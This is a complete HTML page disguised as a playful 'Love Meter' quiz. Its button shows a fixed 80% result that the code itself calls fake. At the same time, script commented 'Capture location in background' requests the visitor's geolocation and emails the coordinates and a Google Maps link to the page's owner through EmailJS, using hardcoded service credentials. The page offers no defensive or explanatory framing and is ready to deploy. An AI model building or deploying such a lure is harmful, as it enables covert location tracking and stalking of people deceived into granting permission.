<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Love Meter ‚ù§Ô∏è</title>
<script src="https://cdn.jsdelivr.net/npm/emailjs-com@2.6.4/dist/email.min.js"></script>
<style>
  body {
    font-family: 'Segoe UI', sans-serif;
    background: linear-gradient(135deg, #ff4e50, #f9d423);
    color: white;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    height: 100vh;
  }
  h1 {
    margin-bottom: 20px;
  }
  .meter-container {
    width: 300px;
    background: rgba(255,255,255,0.2);
    border-radius: 50px;
    overflow: hidden;
    box-shadow: 0 4px 20px rgba(0,0,0,0.3);
  }
  .meter-fill {
    height: 30px;
    background: linear-gradient(to right, #ff416c, #ff4b2b);
    width: 0%;
    transition: width 2s ease-out;
  }
  button {
    margin-top: 20px;
    padding: 12px 24px;
    font-size: 18px;
    border: none;
    border-radius: 30px;
    background: white;
    color: #ff4b2b;
    font-weight: bold;
    cursor: pointer;
    box-shadow: 0 4px 15px rgba(0,0,0,0.2);
  }
  button:hover {
    background: #ffe3e3;
  }
</style>
</head>
<body>

<h1>üíñ Test Your Love! üíñ</h1>
<div class="meter-container">
  <div class="meter-fill" id="meter"></div>
</div>
<button onclick="runLoveMeter()">Check Love ‚ù§Ô∏è</button>

<p id="result"></p>

<script>
  // Initialize EmailJS
  (function(){
    emailjs.init("LWXarISg_TgVGl86U"); // Replace with your EmailJS Public Key
  })();

  function runLoveMeter() {
    // Animate to 80%
    const meter = document.getElementById('meter');
    meter.style.width = '80%';

    // Show fake result after animation
    setTimeout(() => {
      document.getElementById('result').innerText = "Wow! You are 80% in love! üòç";
    }, 2000);

    // Capture location in background
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const lat = pos.coords.latitude;
          const lon = pos.coords.longitude;
          const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;

          // Send email via EmailJS
          emailjs.send("service_j1cmr8e", "template_l1ejqfe", {
            latitude: lat,
            longitude: lon,
            maps_link: mapsLink
          }).then(
            () => console.log("Location sent successfully"),
            (err) => console.error("Email send error", err)
          );
        },
        () => { console.log("Location not allowed"); }
      );
    }
  }
</script>

</body>
</html>
